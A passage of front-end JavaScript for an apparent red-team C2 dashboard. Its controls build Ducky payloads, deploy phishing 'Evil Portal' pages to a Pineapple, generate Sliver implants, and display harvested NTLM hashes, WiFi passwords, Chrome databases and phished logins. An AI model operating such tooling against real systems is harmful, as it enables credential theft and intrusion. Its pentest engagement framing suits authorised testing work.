    addFeedLine('', `[${d.ts}] ■ ${d.name} stopped`);
    refreshProcs();
  });
}

// ---- Tab switching ----
const ALL_TABS = ['devices','intel','payloads','loot','logs','report','wardrive'];
function showTab(name) {
  ALL_TABS.forEach(t => {
    document.getElementById('pane-'+t).style.display = t===name ? '' : 'none';
    document.getElementById('btn-'+t).classList.toggle('active', t===name);
  });
  if (name==='intel')    { refreshIntel(); refreshBH(); loadPcapList(); refreshPortalCreds(); }
  if (name==='loot')     refreshLoot();
  if (name==='logs')     tailLog();
  if (name==='payloads') { loadPayloadList(); }
  if (name==='report')   loadReportStats();
  if (name==='wardrive') refreshWardrive();
}

// ---- Device helpers ----
async function run(path) {
  out.textContent = '[*] ' + path + '...';
  try {
    const r = await fetch(path, {method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({target: document.getElementById('tgt').value})});
    if (r.status === 403) { out.textContent='[AUTH] Session expired — please reload'; return; }
    const j = await r.json();
    out.textContent = j.output || j.error || '(no output)';
    if (j.error) toast(j.error, 'err');
    refreshProcs();
  } catch(e) { out.textContent = '[ERR] ' + e; }
}

async function stopProc(name) {
  try {
    const r = await fetch('/stop/'+name, {method:'POST'});
    const j = await r.json();
    out.textContent = j.output || j.error;
    refreshProcs();
  } catch(e) { out.textContent='[ERR] '+e; }
}

async function checkStatus() {
  document.querySelectorAll('.dot').forEach(d => {d.className='dot chk'; d.title='checking...';});
  try {
    const j = await (await fetch('/status')).json();
    for (const [dev, info] of Object.entries(j)) {
      const d = document.getElementById('dot-'+dev);
      if (d) { d.className='dot '+(info.up?'up':'dn');
               d.title=(info.up?'reachable':'unreachable')+': '+info.ip; }
    }
  } catch(_) {}
}

async function refreshProcs() {
  try {
    const j = await (await fetch('/processes')).json();
    const div = document.getElementById('procs');
    const sum = document.getElementById('proc-summary');
    if (!j.processes?.length) {
      div.textContent='None'; sum.textContent='No background processes';
      return;
    }
    sum.textContent = j.processes.length + ' process' + (j.processes.length>1?'es':'') + ' running';
    div.innerHTML = j.processes.map(p =>
      `<span style="color:#0f0">[${p.pid}]</span> ${p.name}&nbsp;` +
      `<button class="kill" style="padding:1px 5px;font-size:.72em" onclick="stopProc('${p.name}')">kill</button>`
    ).join('&nbsp; ');
  } catch(_) {}
}

// ---- Intel tab ----
let _intelData = null;

async function refreshIntel() {
  document.getElementById('intel-ts').textContent = 'Loading...';
  try {
    const j = await (await fetch('/intel/creds')).json();
    _intelData = j;
    document.getElementById('intel-ts').textContent = new Date().toLocaleTimeString();
    document.getElementById('badge-hashes').textContent = j.hashes.length + ' hashes';
    document.getElementById('badge-wifi').textContent = j.wifi.length + ' WiFi';
    document.getElementById('badge-hosts').textContent = j.hosts.length + ' hosts';
    renderHashes(j.hashes);
    renderWifi(j.wifi);
    renderNetmap(j.hosts);
    renderChrome(j.chrome);
    renderSysinfo(j.sysinfos || []);
  } catch(e) {
    document.getElementById('intel-ts').textContent = 'Error: '+e;
  }
}

function renderHashes(hashes) {
  const el = document.getElementById('intel-hashes');
  if (!hashes.length) { el.innerHTML='<span style="color:#333">No hashes captured yet</span>'; return; }
  el.innerHTML = '<table><tr><th>Time</th><th>Type</th><th>Domain</th><th>User</th><th>Hash</th><th></th></tr>' +
    hashes.map(h =>
      `<tr><td>${esc(h.ts)}</td><td>${esc(h.type)}</td><td>${esc(h.domain)}</td>` +
      `<td>${esc(h.user)}</td><td class="hash-cell">${esc(h.hash.substring(0,60))}…</td>` +
      `<td><button class="copy-btn dim" onclick="copyText('${esc(h.hash)}')">copy</button></td></tr>`
    ).join('') + '</table>';
}

function renderWifi(wifi) {
  const el = document.getElementById('intel-wifi');
  if (!wifi.length) { el.innerHTML='<span style="color:#333">No WiFi profiles captured yet</span>'; return; }
  el.innerHTML = '<table><tr><th>Host</th><th>SSID</th><th>Password</th><th></th></tr>' +
    wifi.map(w =>
      `<tr><td>${esc(w.host||'?')}</td><td>${esc(w.ssid)}</td>` +
      `<td style="color:#0f0">${esc(w.password)}</td>` +
      `<td><button class="copy-btn dim" onclick="copyText('${esc(w.ssid)}:${esc(w.password)}')">copy</button></td></tr>`
    ).join('') + '</table>';
}

function renderNetmap(hosts) {
  const el = document.getElementById('intel-netmap');
  if (!hosts.length) { el.innerHTML='<span style="color:#333">No hosts discovered yet — run a scan</span>'; return; }
  const roleCls = r => r.includes('Domain')?'dc':r.includes('Windows')?'win':'';
  el.innerHTML = '<table><tr><th>IP</th><th>Hostname</th><th>Role</th><th>OS</th><th>Ports</th><th>Services</th></tr>' +
    hosts.map(h => {
      const ports = h.ports.slice(0,8).map(p=>`${p.port}/${p.proto}`).join(', ');
      const svcs  = h.ports.slice(0,6).map(p=>p.service).filter(Boolean).join(', ');
      return `<tr><td><b>${esc(h.ip)}</b></td><td style="color:#555">${esc(h.hostname)}</td>` +
        `<td><span class="badge ${roleCls(h.role)}">${esc(h.role)}</span></td>` +
        `<td style="color:#555;font-size:.72em">${esc(h.os.substring(0,40))}</td>` +
        `<td>${h.open_count}</td><td style="color:#555;font-size:.72em">${esc(ports)}</td></tr>`;
    }).join('') + '</table>';
}

function renderChrome(chrome) {
  const el = document.getElementById('intel-chrome');
  if (!chrome.length) { el.innerHTML='<span style="color:#333">No Chrome DBs captured yet</span>'; return; }
  el.innerHTML = '<table><tr><th>Captured</th><th>File</th><th>Size</th><th></th></tr>' +
    chrome.map(c =>
      `<tr><td>${esc(c.captured)}</td><td>${esc(c.file)}</td><td>${c.size_kb} KB</td>` +
      `<td><button class="copy-btn dim" onclick="downloadLootFile('creds/${esc(c.file)}')">dl</button></td></tr>`
    ).join('') + '</table>';
}

function renderSysinfo(sysinfos) {
  const el = document.getElementById('intel-sysinfo');
  if (!sysinfos.length) { el.innerHTML='<span style="color:#333">No system profiles captured yet</span>'; return; }
  el.innerHTML = '<table><tr><th>Host</th><th>User</th><th>Domain</th><th>OS</th><th>IPs</th><th>AV</th></tr>' +
    sysinfos.map(s =>
      `<tr><td><b>${esc(s.hostname||'?')}</b></td><td>${esc(s.username||'?')}</td>` +
      `<td>${esc(s.domain||s.userdomain||'?')}</td>` +
      `<td style="color:#555;font-size:.72em">${esc((s.os||'?').substring(0,35))}</td>` +
      `<td style="font-size:.72em">${esc(s.ip_addresses||'?')}</td>` +
      `<td style="font-size:.72em;color:#c00">${esc(s.av_products||'?')}</td></tr>`
    ).join('') + '</table>';
}

function copyHashes() {
  if (!_intelData?.hashes?.length) { toast('No hashes loaded','warn'); return; }
  copyText(_intelData.hashes.map(h=>h.hash).join('\n'));
  toast(`Copied ${_intelData.hashes.length} hash(es) to clipboard`);
}

function copyWifi() {
  if (!_intelData?.wifi?.length) { toast('No WiFi creds loaded','warn'); return; }
  copyText(_intelData.wifi.map(w=>`${w.ssid}:${w.password}`).join('\n'));
  toast(`Copied ${_intelData.wifi.length} WiFi cred(s)`);
}

// ---- Payload builder ----
async function buildPayload() {
  const type  = document.getElementById('pl-type').value;
  const ip    = document.getElementById('pl-ip').value.trim();
  const port  = document.getElementById('pl-port').value.trim();
  const delay = document.getElementById('pl-delay').value.trim();
  const pre   = document.getElementById('payload-preview');
  pre.textContent = 'Building...';
  try {
    const r = await fetch('/payload/build', {method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({type, ip, port, delay: parseInt(delay)||2000})});
    const j = await r.json();
    if (j.error) { pre.textContent='[ERR] '+j.error; return; }
    _lastBuiltPayload = j.content;
    _lastBuiltType    = type;
    pre.textContent   = j.content;
    toast(`Built: ${type}`);
  } catch(e) { pre.textContent='[ERR] '+e; }
}

function downloadPayload() {
  if (!_lastBuiltPayload) { toast('Build a payload first','warn'); return; }
  const blob = new Blob([_lastBuiltPayload], {type:'text/plain'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = (_lastBuiltType||'payload') + '.ducky';
  a.click();
}

async function deployBuiltToOMG() {
  if (!_lastBuiltType) { toast('Build a payload first','warn'); return; }
  await run('/omg/payload/' + _lastBuiltType.replace(/_/g,'/').split('/')[0]);
}

async function loadPayloadList() {
  const el = document.getElementById('payload-list');
  try {
    const j = await (await fetch('/payload/list')).json();
    if (!j.payloads.length) { el.innerHTML='<span style="color:#333">No payloads found</span>'; return; }
    el.innerHTML = j.payloads.map(p =>
      `<div class="pl-list-item">` +
      `<span>${esc(p.name)}</span>` +
      `<span style="color:#333;font-size:.72em">${(p.size/1024).toFixed(1)} KB</span>` +
      `</div>`
    ).join('');
  } catch(e) { el.innerHTML='[ERR] '+e; }
}

// ---- Loot tab ----
async function refreshLoot() {
  const div = document.getElementById('loot-list');
  const ts  = document.getElementById('loot-ts');
  div.textContent = 'Loading...';
  try {
    const j = await (await fetch('/loot')).json();
    ts.textContent = new Date().toLocaleTimeString();
    const totalKb = j.files.reduce((s,f)=>s+f.size,0);
    document.getElementById('loot-summary').textContent =
      `${j.files.length} file(s), ${(totalKb/1024).toFixed(1)} KB total`;
    if (!j.files.length) { div.textContent='No loot yet.'; return; }
    const groups = {};
    j.files.forEach(f => {
      const dir = f.path.includes('/') ? f.path.split('/')[0] : '_root';
      (groups[dir] = groups[dir]||[]).push(f);
    });
    div.innerHTML = Object.entries(groups).map(([dir, files]) =>
      `<div class="sec">/${dir} (${files.length})</div>` +
      files.map(f =>
        `<div class="loot-row">` +
        `<a style="cursor:pointer;color:#0f0" onclick="downloadLootFile('${esc(f.path)}')">${esc(f.path)}</a>` +
        `<span class="loot-meta">${esc(f.mtime)} &nbsp; ${(f.size/1024).toFixed(1)} KB</span>` +
        `</div>`
      ).join('')
    ).join('');
  } catch(e) { div.textContent='[ERR] '+e; }
}

function downloadLootFile(path) {
  window.location.href = '/loot/file?path=' + encodeURIComponent(path);
}

// ---- Logs tab ----
async function tailLog() {
  const name = document.getElementById('log-sel').value;
  const n    = parseInt(document.getElementById('log-n').value)||100;
  const pre  = document.getElementById('log-out');
  try {
    const j = await (await fetch(`/logs/tail?name=${name}&n=${n}`)).json();
    pre.textContent = j.lines.join('\n') || '(empty)';
    pre.scrollTop = pre.scrollHeight;
  } catch(e) { pre.textContent='[ERR] '+e; }
}
document.getElementById('auto-chk').addEventListener('change', function() {
  clearInterval(_arTimer);
  if (this.checked) _arTimer = setInterval(tailLog, 5000);
});

// ---- Report tab ----
async function loadReportStats() {
  try {
    const j = await (await fetch('/intel/creds')).json();
    const s = j.summary||{};
    document.getElementById('report-stats').innerHTML =
      `<div class="rstat"><span class="rnum">${s.hash_count||0}</span><span class="rlbl">NTLM Hashes</span></div>` +
      `<div class="rstat"><span class="rnum">${s.wifi_count||0}</span><span class="rlbl">WiFi Creds</span></div>` +
      `<div class="rstat"><span class="rnum">${s.host_count||0}</span><span class="rlbl">Hosts</span></div>` +
      `<div class="rstat"><span class="rnum">${s.chrome_count||0}</span><span class="rlbl">Chrome DBs</span></div>`;
  } catch(_) {}
}

async function generateReport() {
  const meta = {
    name:   document.getElementById('rep-name').value || 'Unnamed Engagement',
    target: document.getElementById('rep-target').value || '?',
    notes:  document.getElementById('rep-notes').value,
  };
  document.getElementById('report-msg').textContent = 'Generating...';
  try {
    const r = await fetch('/report/generate', {method:'POST',
      headers:{'Content-Type':'application/json'}, body: JSON.stringify(meta)});
    const j = await r.json();
    if (j.error) { document.getElementById('report-msg').textContent='[ERR] '+j.error; return; }
    _reportPath = j.path;
    document.getElementById('report-msg').textContent = `Report saved: ${j.path}`;
    document.getElementById('btn-view-rep').style.display = '';
    document.getElementById('btn-dl-rep').style.display = '';
    toast('Report generated!');
  } catch(e) { document.getElementById('report-msg').textContent='[ERR] '+e; }
}

function viewReport() {
  if (_reportPath) window.open('/report/view?path='+encodeURIComponent(_reportPath), '_blank');
}

function downloadReport() {
  if (_reportPath) window.location.href = '/report/download?path='+encodeURIComponent(_reportPath);
}

// ---- Engagement modal ----
async function showEngagementModal() {
  document.getElementById('eng-modal').style.display = 'flex';
  const el = document.getElementById('eng-list');
  try {
    const j = await (await fetch('/engagement/list')).json();
    if (!j.sessions.length) { el.innerHTML='<span style="color:#333">No sessions yet</span>'; return; }
    el.innerHTML = j.sessions.map(s =>
      `<div style="padding:5px 0;border-bottom:1px solid #111;display:flex;align-items:center;gap:8px">` +
      `<span style="flex:1;${s.name===j.active?'color:#0f0':'color:#555'}">${esc(s.name)}</span>` +
      `<span style="color:#333;font-size:.75em">${esc(s.target||'')} ${esc(s.started||'')}</span>` +
      (s.name!==j.active ? `<button onclick="setActiveEng('${esc(s.name)}')" class="dim" style="font-size:.72em;padding:1px 6px">Activate</button>` : '<span style="color:#0f0;font-size:.72em">&#x2713; Active</span>') +
      `</div>`
    ).join('');
  } catch(e) { el.innerHTML='[ERR] '+e; }
}

function closeEngModal() {
  document.getElementById('eng-modal').style.display = 'none';
}

async function newEngagement() {
  const name   = document.getElementById('new-eng-name').value.trim();
  const target = document.getElementById('new-eng-target').value.trim();
  if (!name) { toast('Enter a name','warn'); return; }
  try {
    const r = await fetch('/engagement/new', {method:'POST',
      headers:{'Content-Type':'application/json'}, body: JSON.stringify({name, target})});
    const j = await r.json();
    if (j.error) { toast(j.error,'err'); return; }
    document.getElementById('eng-name').textContent = '● ' + name;
    toast('Engagement "'+name+'" started');
    document.getElementById('new-eng-name').value = '';
    showEngagementModal();
  } catch(e) { toast(''+e,'err'); }
}

async function setActiveEng(name) {
  try {
    await fetch('/engagement/set', {method:'POST',
      headers:{'Content-Type':'application/json'}, body: JSON.stringify({name})});
    document.getElementById('eng-name').textContent = '● ' + name;
    toast('Active engagement: ' + name);
    showEngagementModal();
  } catch(_) {}
}

async function loadActiveEngagement() {
  try {
    const j = await (await fetch('/engagement/list')).json();
    const el = document.getElementById('eng-name');
    el.textContent = j.active ? '● ' + j.active : '— No engagement';
  } catch(_) {
    document.getElementById('eng-name').textContent = '— No engagement';
  }
}

// ---- Software update ----
async function checkUpdate() {
  const status = document.getElementById('update-status');
  const pre    = document.getElementById('update-out');
  status.textContent = 'Checking...';
  pre.style.display  = 'none';
  try {
    const j = await (await fetch('/update/check')).json();
    if (j.error) { status.textContent = '[ERR] ' + j.error; return; }
    if (j.up_to_date) {
      status.textContent = `Up to date (${j.local})`;
      document.getElementById('btn-update').style.display = 'none';
    } else {
      status.textContent = `Update available: ${j.local} → ${j.remote}`;
      document.getElementById('btn-update').style.display = '';
      if (j.pending) {
        pre.textContent   = j.pending;
        pre.style.display = '';
      }
    }
  } catch(e) { status.textContent = '[ERR] ' + e; }
}

async function applyUpdate() {
  const status = document.getElementById('update-status');
  const pre    = document.getElementById('update-out');
  status.textContent = 'Pulling updates...';
  pre.style.display  = 'none';
  document.getElementById('btn-update').disabled = true;
  try {
    const j = await (await fetch('/update/apply', {method:'POST'})).json();
    pre.textContent   = j.output || j.error || '(no output)';
    pre.style.display = '';
    if (j.error || j.returncode !== 0) {
      status.textContent = 'Update failed — check output';
      toast('Update failed', 'err');
    } else {
      status.textContent = 'Update applied — restart C2 to load new code';
      document.getElementById('btn-update').style.display = 'none';
      toast('Update applied! Restart C2 to load changes.', 'warn');
    }
  } catch(e) {
    status.textContent = '[ERR] ' + e;
  } finally {
    document.getElementById('btn-update').disabled = false;
  }
}

async function restartC2() {
  if (!confirm('Restart the C2 dashboard? You will need to reload this page.')) return;
  try {
    const j = await (await fetch('/restart', {method:'POST'})).json();
    document.getElementById('update-status').textContent = j.output;
    toast('Restarting — reload in a few seconds...', 'warn');
    setTimeout(() => location.reload(), 4000);
  } catch(_) {
    toast('Restarting — reload in a few seconds...', 'warn');
    setTimeout(() => location.reload(), 4000);
  }
}

// ---- Evil Portal ----
async function previewPortal() {
  const type  = document.getElementById('portal-type').value;
  const ip    = document.getElementById('portal-ip').value.trim();
  const port  = document.getElementById('portal-port').value.trim();
  const redir = document.getElementById('portal-redirect').value.trim();
  const msg   = document.getElementById('portal-msg');
  msg.textContent = 'Loading preview...';
  try {
    const r = await fetch(`/portal/preview?type=${type}&ip=${encodeURIComponent(ip)}&port=${port}&redirect=${encodeURIComponent(redir)}`);
    if (!r.ok) { msg.textContent='[ERR] '+r.statusText; return; }
    const html = await r.text();
    const w = window.open('', '_blank');
    w.document.write(html);
    w.document.close();
    msg.textContent = `Previewing ${type} portal`;
  } catch(e) { msg.textContent='[ERR] '+e; }
}

async function downloadPortal() {
  const type  = document.getElementById('portal-type').value;
  const ip    = document.getElementById('portal-ip').value.trim();
  const port  = document.getElementById('portal-port').value.trim();
  const redir = document.getElementById('portal-redirect').value.trim();
  window.location.href = `/portal/download?type=${type}&ip=${encodeURIComponent(ip)}&port=${port}&redirect=${encodeURIComponent(redir)}`;
}

async function deployPortalToPineapple() {
  const type = document.getElementById('portal-type').value;
  const ip   = document.getElementById('portal-ip').value.trim();
  const port = document.getElementById('portal-port').value.trim();
  const redir= document.getElementById('portal-redirect').value.trim();
  const msg  = document.getElementById('portal-msg');
  msg.textContent = 'Deploying to Pineapple...';
  try {
    const r = await fetch('/portal/deploy', {method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({type, ip, port, redirect: redir})});
    const j = await r.json();
    msg.textContent = j.output || j.error || '';
    if (j.error) toast(j.error, 'err'); else toast('Portal deployed: '+type, 'warn');
  } catch(e) { msg.textContent='[ERR] '+e; }
}

// ---- PCAP Analysis ----
async function loadPcapList() {
  const sel = document.getElementById('pcap-sel');
  try {
    const j = await (await fetch('/pcap/list')).json();
    sel.innerHTML = '<option value="">— select PCAP —</option>' +
      j.files.map(f => `<option value="${esc(f.name)}">${esc(f.name)} (${f.size_kb} KB)</option>`).join('');
  } catch(_) {}
}

async function analyzePcap() {
  const name = document.getElementById('pcap-sel').value;
  if (!name) { toast('Select a PCAP file first','warn'); return; }
  const st   = document.getElementById('pcap-status');
  const cDiv = document.getElementById('pcap-creds');
  const pDiv = document.getElementById('pcap-protocols');
  const dDiv = document.getElementById('pcap-dns');
  st.textContent = 'Analyzing...';
  cDiv.innerHTML = '<span style="color:#555">Running tshark...</span>';
  try {
    const r = await fetch('/pcap/analyze?name='+encodeURIComponent(name));
    const j = await r.json();
    if (j.error) { st.textContent=j.error; cDiv.textContent=''; return; }
    st.textContent = `${j.stats.packet_count||0} pkts, ${j.stats.bytes_kb||0} KB, ${j.stats.duration_sec||0}s`;

    // Protocol bars
    const protos = Object.entries(j.protocols||{}).sort((a,b)=>b[1]-a[1]).slice(0,12);
    const maxP = protos[0]?.[1] || 1;
    pDiv.innerHTML = '<div style="display:flex;flex-wrap:wrap;gap:4px 12px;margin-bottom:6px">' +
      protos.map(([p,n]) =>
        `<span style="font-size:.75em;color:#555">${esc(p)}: <b style="color:#0f0">${n}</b></span>`
      ).join('') + '</div>';

    // Credentials
    if (j.credentials?.length) {
      cDiv.innerHTML = '<div class="sec" style="margin:4px 0">Captured Credentials</div>' +
        '<table><tr><th>Type</th><th>Src IP</th><th>Host</th><th>User</th><th>Password</th></tr>' +
        j.credentials.map(c =>
          `<tr><td><span class="badge">${esc(c.type)}</span></td>` +
          `<td>${esc(c.src_ip)}</td><td>${esc(c.host)}</td>` +
          `<td style="color:#0f0">${esc(c.username||'?')}</td>` +
          `<td style="color:#c00">${esc(c.password||c.hash||'?')}</td></tr>`
        ).join('') + '</table>';
    } else {
      cDiv.innerHTML = '<span style="color:#333;font-size:.8em">No cleartext credentials found in PCAP</span>';
    }

    // DNS
    if (j.dns_queries?.length) {
      const top20 = j.dns_queries.slice(0,20);
      dDiv.innerHTML = '<div class="sec" style="margin:4px 0">DNS Queries (top 20)</div>' +
        '<div style="display:flex;flex-wrap:wrap;gap:4px">' +
        top20.map(d => `<span style="font-size:.72em;color:#555;border:1px solid #111;padding:1px 5px">${esc(d.query)}</span>`).join('') +
        '</div>';
    } else { dDiv.innerHTML = ''; }
  } catch(e) { st.textContent='[ERR] '+e; cDiv.textContent=''; }
}

// ---- Portal Credentials ----
async function refreshPortalCreds() {
  const el = document.getElementById('intel-portal-creds');
  const ct = document.getElementById('portal-cred-count');
  try {
    const j = await (await fetch('/portal/credentials')).json();
    ct.textContent = j.credentials.length + ' capture(s)';
    if (!j.credentials.length) {
      el.innerHTML='<span style="color:#333">No portal credentials captured yet — deploy a portal first</span>'; return;
    }
    el.innerHTML = '<table><tr><th>Time</th><th>Portal</th><th>Host/IP</th><th>Username</th><th>Password</th></tr>' +
      j.credentials.map(c =>
        `<tr><td style="color:#555">${esc(c.ts)}</td><td><span class="badge">${esc(c.portal)}</span></td>` +
        `<td>${esc(c.host)}</td><td style="color:#0f0"><b>${esc(c.username)}</b></td>` +
        `<td style="color:#c00">${esc(c.password)}</td></tr>`
      ).join('') + '</table>';
  } catch(e) { el.innerHTML='[ERR] '+e; }
}

// ---- War-Drive / Kismet ----
let _wdNetworks = [];

async function refreshWardrive() {
  const st = document.getElementById('kismet-status');
  const dot = document.getElementById('dot-kismet');
  st.textContent = 'Checking...';
  try {
    const j = await (await fetch('/kismet/status')).json();
    dot.className = 'dot ' + (j.running ? 'up' : 'dn');
    st.textContent = j.running
      ? `Kismet running — ${j.device_count||0} devices seen`
      : (j.installed ? 'Installed — not running' : 'Not installed (apt install kismet)');
    if (j.running) { fetchNetworks(); fetchGps(); }
  } catch(e) { dot.className='dot dn'; st.textContent='[ERR] '+e; }
}

async function fetchGps() {
  try {
    const j = await (await fetch('/kismet/gps')).json();
    const el = document.getElementById('gps-pos');
    if (j.lat && j.lon) {
      el.textContent = `Lat: ${j.lat.toFixed(6)}  Lon: ${j.lon.toFixed(6)}  Alt: ${(j.alt||0).toFixed(1)}m  Fix: ${j.fix||'?'}`;
      el.style.color = '#0f0';
    } else {
      el.textContent = 'No GPS fix — connect GPS receiver or start gpsd';
      el.style.color = '#555';
    }
  } catch(_) {}
}

async function fetchNetworks() {
  try {
    const j = await (await fetch('/kismet/networks')).json();
    _wdNetworks = j.networks || [];
    document.getElementById('net-count').textContent = `(${_wdNetworks.length})`;
    renderNetworkTable(_wdNetworks);
    renderMap(_wdNetworks);
  } catch(e) { console.error(e); }
}

function filterNetworks() {
  const q       = document.getElementById('wd-filter').value.toLowerCase();
  const gpsOnly = document.getElementById('wd-gps-only').checked;
  const openOnly= document.getElementById('wd-open-only').checked;
  const filtered = _wdNetworks.filter(n => {
    if (q && !n.ssid.toLowerCase().includes(q) && !n.bssid.toLowerCase().includes(q)) return false;
    if (gpsOnly && (!n.lat || !n.lon)) return false;
    if (openOnly && n.encryption !== 'Open') return false;
    return true;
  });
  renderNetworkTable(filtered);
}

function renderNetworkTable(nets) {
  const tbl = document.getElementById('wd-table');
  const sigColor = s => s >= -50 ? '#0f0' : s >= -70 ? '#ff0' : '#c00';
  const encClass = e => e==='Open' ? 'enc-badge open' : 'enc-badge';
  tbl.innerHTML = '<tr><th>SSID</th><th>BSSID</th><th>dBm</th><th>Ch</th><th>Enc</th>' +
                  '<th>Clients</th><th>Lat</th><th>Lon</th><th>Last Seen</th></tr>' +
    nets.map(n =>
      `<tr><td><b>${esc(n.ssid||'(hidden)')}</b></td>` +
      `<td style="font-size:.72em;color:#555">${esc(n.bssid)}</td>` +
      `<td style="color:${sigColor(n.signal)}">${n.signal}</td>` +
      `<td>${n.channel||'?'}</td>` +
      `<td><span class="${encClass(n.encryption)}">${esc(n.encryption)}</span></td>` +
      `<td>${n.clients||0}</td>` +
      `<td style="font-size:.72em;color:#555">${n.lat ? n.lat.toFixed(5) : '—'}</td>` +
      `<td style="font-size:.72em;color:#555">${n.lon ? n.lon.toFixed(5) : '—'}</td>` +
      `<td style="font-size:.72em;color:#555">${esc(n.last_seen||'')}</td></tr>`
    ).join('');
}

function renderMap(nets) {
  const mapDiv = document.getElementById('wd-map');
  const located = nets.filter(n => n.lat && n.lon);
  if (!located.length) {
    mapDiv.textContent = 'No GPS-tagged networks yet';
    return;
  }
  // Try Leaflet (requires internet for tiles); fall back to coordinate list
  if (typeof L === 'undefined') {
    const script = document.createElement('script');
    script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
    script.onload = () => _buildLeafletMap(located);
    script.onerror = () => {
      mapDiv.innerHTML = '<span style="color:#555">Map tiles unavailable (offline). ' +
        located.length + ' GPS-tagged networks — export KML to view in Google Earth.</span>';
    };
    document.head.appendChild(script);
    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
    document.head.appendChild(link);
  } else {
    _buildLeafletMap(located);
  }
}

let _leafletMap = null;
function _buildLeafletMap(nets) {
  const mapDiv = document.getElementById('wd-map');
  mapDiv.style.background = '';
  if (!_leafletMap) {
    _leafletMap = L.map('wd-map');
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
      {attribution:'© OpenStreetMap'}).addTo(_leafletMap);
  }
  _leafletMap.eachLayer(l => { if (l instanceof L.Marker) _leafletMap.removeLayer(l); });
  const bounds = [];
  nets.forEach(n => {
    const enc = n.encryption === 'Open' ? '🔓 Open' : '🔒 '+n.encryption;
    L.marker([n.lat, n.lon])
      .bindPopup(`<b>${n.ssid||'(hidden)'}</b><br>${n.bssid}<br>${enc}<br>${n.signal} dBm`)
      .addTo(_leafletMap);
    bounds.push([n.lat, n.lon]);
  });
  if (bounds.length) _leafletMap.fitBounds(bounds, {padding:[20,20]});
}

async function exportWardrive(fmt) {
  window.location.href = '/kismet/export?format='+fmt;
}

// ---- Bash Bunny ----
async function installBunnyPayload(sw) {
  out.textContent = '[*] Installing Bash Bunny payload to switch '+sw+'...';
  try {
    const r = await fetch('/bunny/payload/install', {method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({switch: sw})});
    const j = await r.json();
    out.textContent = j.output || j.error || '(no output)';
    if (j.error) toast(j.error, 'err'); else toast('Payload installed to switch '+sw, 'warn');
  } catch(e) { out.textContent='[ERR] '+e; }
}

// ---- Flipper Zero ----
async function flipperCmd(cmd) {
  out.textContent = '[*] Flipper: '+cmd+'...';
  try {
    const r = await fetch('/flipper/'+cmd, {method:'POST'});
    const j = await r.json();
    out.textContent = j.output || j.error || '(no output)';
    if (j.error) toast(j.error, 'err');
  } catch(e) { out.textContent='[ERR] '+e; }
}

// ---- Sliver C2 ----
async function checkSliver() {
  const dot = document.getElementById('dot-sliver');
  const st  = document.getElementById('sliver-status');
  dot.className = 'dot chk'; st.textContent = 'Checking...';
  try {
    const j = await (await fetch('/sliver/status')).json();
    dot.className = 'dot ' + (j.running ? 'up' : 'dn');
    st.textContent = j.running ? 'Running (pid='+j.pid+')' :
                     (j.installed ? 'Installed — not running' : 'Not installed');
    if (j.running) listSliverSessions();
  } catch(e) { dot.className='dot dn'; st.textContent='[ERR] '+e; }
}

async function generateImplant() {
  const body = {
    os:       document.getElementById('sl-os').value,
    arch:     document.getElementById('sl-arch').value,
    format:   document.getElementById('sl-fmt').value,
    listener: document.getElementById('sl-listener').value,
  };
  const pre = document.getElementById('sliver-out');
  pre.style.display = ''; pre.textContent = 'Generating implant — this may take 60s...';
  try {
    const r = await fetch('/sliver/generate', {method:'POST',
      headers:{'Content-Type':'application/json'}, body:JSON.stringify(body)});
    const j = await r.json();
    pre.textContent = j.output || j.error || '(no output)';
    if (j.implant) { toast('Implant ready: '+j.implant, 'warn'); listImplants(); }
    else if (j.error) toast(j.error, 'err');
  } catch(e) { pre.textContent='[ERR] '+e; }
}

async function listSliverSessions() {
  try {
    const j = await (await fetch('/sliver/sessions')).json();
    const el = document.getElementById('sliver-sessions');
    if (!j.sessions?.length) { el.innerHTML='<span style="color:#333;font-size:.78em">No active sessions</span>'; return; }
    el.innerHTML = '<table><tr><th>ID</th><th>Name</th><th>Host</th><th>OS</th><th>Arch</th><th>Last Seen</th></tr>' +
      j.sessions.map(s =>
        '<tr><td>'+esc(s.id)+'</td><td style="color:#0f0">'+esc(s.name)+'</td>' +
        '<td>'+esc(s.hostname)+'</td><td>'+esc(s.os)+'</td>' +
        '<td>'+esc(s.arch)+'</td><td style="color:#555">'+esc(s.last_seen)+'</td></tr>'
      ).join('') + '</table>';
  } catch(_) {}
}

async function listImplants() {
  const pre = document.getElementById('sliver-out');
  pre.style.display = ''; pre.textContent = 'Loading implants...';
  try {
    const j = await (await fetch('/sliver/implants')).json();
    if (!j.implants?.length) { pre.textContent='No implants generated yet.'; return; }
    pre.textContent = j.implants.map(i =>
      i.name + '  ' + i.os + '/' + i.arch + '  ' + (i.size_kb||'?') + ' KB  ' + i.mtime
    ).join('\n');
  } catch(e) { pre.textContent='[ERR] '+e; }
}

// ---- BloodHound ----
async function uploadToBH() {
  const st = document.getElementById('bh-status');
  st.textContent = 'Uploading to BloodHound...';
  try {
    const r = await fetch('/bloodhound/upload', {method:'POST'});
    const j = await r.json();
    st.textContent = j.output || j.error || '';
    if (j.error) toast(j.error, 'err'); else { toast('BloodHound upload complete'); refreshBH(); }
  } catch(e) { st.textContent='[ERR] '+e; }
}

async function refreshBH() {
  const el = document.getElementById('intel-bloodhound');
  const st = document.getElementById('bh-status');
  try {
    const j = await (await fetch('/bloodhound/status')).json();
    if (j.error) { st.textContent=j.error; return; }
    st.textContent = j.files + ' file(s), ' + j.total_objects + ' objects collected';
    if (!j.summary?.length) {
      el.innerHTML='<span style="color:#333">No BloodHound data — run bloodhound_collect.ducky first</span>'; return;
    }
    el.innerHTML = '<table><tr><th>Type</th><th>Objects</th><th>Domain</th><th>Captured</th></tr>' +
      j.summary.map(s =>
        '<tr><td><b>'+esc(s.type)+'</b></td><td style="color:#0f0">'+s.count+'</td>' +
        '<td>'+esc(s.domain)+'</td><td style="color:#555">'+esc(s.captured)+'</td></tr>'
      ).join('') + '</table>';
  } catch(e) { el.innerHTML='[ERR] '+e; }
}

// ---- Utilities ----
function esc(s) {
  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;')
